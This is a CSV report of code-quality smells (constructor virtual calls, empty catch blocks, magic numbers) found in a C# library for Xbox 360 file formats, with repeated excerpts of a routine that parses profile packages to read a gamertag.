Implementation smell,Namespace,Class,File,Method,Description
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "Dispose".
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,extthrd,The method has an empty catch block.
Empty Catch Block,X360.GDFX,GDFFolder,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,xExtract,The method has an empty catch block.
Empty Catch Block,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,ReadFolder,The method has an empty catch block.
Empty Catch Block,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DJsIO,The method has an empty catch block.
Empty Catch Block,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DJsIO,The method has an empty catch block.
Empty Catch Block,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,MakeHandle,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,DeleteTempFiles,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,xCheckDirectory,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The method has an empty catch block.
Empty Catch Block,X360.Profile,RecordEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xLoadDetails,The method has an empty catch block.
Empty Catch Block,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The method has an empty catch block.
Magic Number,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The following statement contains a magic number: try {  	DJsIO xIO = new DJsIO (xData' true);  	xNLen = xIO.ReadByte ();  	if (xNLen == 0xE5 || xNLen == 0xFF || xNLen == 0 || xNLen > 0x2A)  		return;  	byte xatt = (byte)((xIO.ReadByte () >> 4) & 1);  	byte xLen = (byte)(xNLen & 0x3F);  	xName = xIO.ReadString (StringForm.ASCII' xLen);  	xName.IsValidXboxName ();  	xIO.Position = 0x2C;  	xStartBlock = xIO.ReadUInt32 ();  	if (xStartBlock == Constants.FATX32End)  		return;  	xSize = xIO.ReadInt32 ();  	xT1 = xIO.ReadInt32 ();  	xT2 = xIO.ReadInt32 ();  	xT3 = xIO.ReadInt32 ();  	if (xatt == 1)  		xIsFolder = true;  	else if (xSize == 0)  		return;  	xIsValid = true;  }  catch {  	xIsValid = false;  }  
Magic Number,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetData,The following statement contains a magic number: xArray.Add ((byte)((IsFolder ? 1 : 0) << 4));  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
